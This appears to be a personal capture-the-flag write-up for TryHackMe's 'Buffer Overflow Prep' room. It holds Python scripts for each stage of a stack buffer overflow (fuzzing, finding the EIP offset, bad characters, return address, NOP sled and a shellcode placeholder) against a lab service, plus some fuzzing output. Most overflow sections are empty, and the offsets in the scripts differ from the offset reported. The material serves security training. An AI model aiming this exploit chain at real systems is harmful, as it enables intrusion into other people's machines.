# Buffer Overflow Prep

**Date:** 27, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/bufferoverflowprep) to go to the TryHackMe room.

- Connect to the machine using RDP:

```bash
$ xfreerdp /u:admin /p:password /v:MACHINE_IP /workarea /cert:ignore
```

- Here **spiking** is not necessary, because we know that all the commands are vulnerable.

---

## Scripts

### Fuzzing

```py
#! /usr/bin/python3

import socket, sys, time

ip = "IP_ADDRESS"
port = 1337
timeout = 5

prefix = b'OVERFLOW1 '
payload = [
    prefix,
    b'A'*100,
]

while True:
        try:
                s = socket.socket()
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                s.send(b''.join(payload))
                print('Fuzzing with {} bytes'.format(len(payload[1])))
                s.recv(1024)
                s.close()
        except:
                print('Fuzzzing crashed at {} bytes'.format(len(payload[1])))
                exit(0)

        payload[1] += b'A'*100
        time.sleep(1)
```

### Finding Offset & overwriting EIP

- Generate pattern using **pattern_create**:

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
```

- Find offset using **pattern_offset**:

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <LENGTH> -q <EIP_VALUE>
```



```py
#! /usr/bin/python3

import socket, sys, time

ip = "IP_ADDRESS"
port = 1337
timeout = 5

prefix = b'OVERFLOW1 '
pattern = b'PATTERN_GOES_HERE'


payload = [
    prefix,
    pattern,
]

payload = b''.join(payload)

try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(payload)
        print('Fuzzing with {} bytes'.format(len(payload) - len(prefix)))
        s.recv(1024)
        s.close()
except:
        print('Fuzzing crashed at {} bytes'.format(len(payload) - len(prefix)))
        exit(0)
```

### Finding Bad chars

```py
#! /usr/bin/python3

import socket, sys, time
import struct

ip = "IP_ADDRESS"
port = 1337
timeout = 5

prefix = b'OVERFLOW1 '
offset = 2003

# 4 Bytes EIP
eip = b'B' * 4

# Generate Bad characters from 1 to 255 (256 will be exculded by range function)
badchars = b''.join([struct.pack('<B', x) for x in range(1,256)])

payload = [
    prefix,
    b'A' * offset,
    eip,
    badchars,
]

payload = b''.join(payload)

try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(payload)
        s.recv(1024)
        s.close()
except:
        print('Fuzzing crashed at {} bytes'.format(len(payload) - len(prefix) - len(eip) - len(badchars)))
```


### Finding Right Module

```py
#! /usr/bin/python3

import socket, sys, time
import struct

ip = "IP_ADDRESS"
port = 1337
timeout = 5

prefix = b'OVERFLOW1 '
offset = 2003

# 4 Bytes EIP
eip = b''.join([struct.pack('<I', 0x<ADDRESS_GOES_HERE>)])

payload = [
    prefix,
    b'A' * offset,
    eip,
]

payload = b''.join(payload)

try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(payload)
        s.recv(1024)
        s.close()
except:
        print('Fuzzing crashed at {} bytes'.format(len(payload) - len(prefix) - len(eip)))
```

### Shell code & Shell Access

```py
#! /usr/bin/python3

import socket, sys, time
import struct

ip = "IP_ADDRESS"
port = 1337
timeout = 5

prefix = b'OVERFLOW1 '
offset = 1337

# 4 Bytes EIP
eip = b''.join([struct.pack('<I', 0x625011af)])

nop_sled = b'\x90' * 32

buf =  b""  #SHELL CODE

shellcode = buf

payload = [
    prefix,
    b'A' * offset,
    eip,
    nop_sled,
    buf
]

payload = b''.join(payload)

try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(payload)
        s.recv(1024)
        s.close()
except:
        print('Fuzzing crashed at {} bytes'.format(len(payload) - len(prefix) - len(eip) - len(nop_sled) - len(buf)))
```


---

## OVERFLOW 1

### Fuzzing

- Crash occurred at 2000 bytes

```bash
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzzing crashed at 2000 bytes
```

### Finding Offset & overwriting EIP

- Generate Pattern of 2500
- EIP VALUE = 6F43396E
- Exact match at offset 1978


### Finding Bad chars


### Finding Right Module


### Shell code & Shell Access

---

## OVERFLOW 2

### Fuzzing


### Finding Offset & overwriting EIP


### Finding Bad chars


### Finding Right Module


### Shell code & Shell Access

---

## OVERFLOW 3

---

## OVERFLOW 4

---

## OVERFLOW 5

---

## OVERFLOW 6

---

## OVERFLOW 7

---

## OVERFLOW 8

---

## OVERFLOW 9

---

## OVERFLOW 10

---

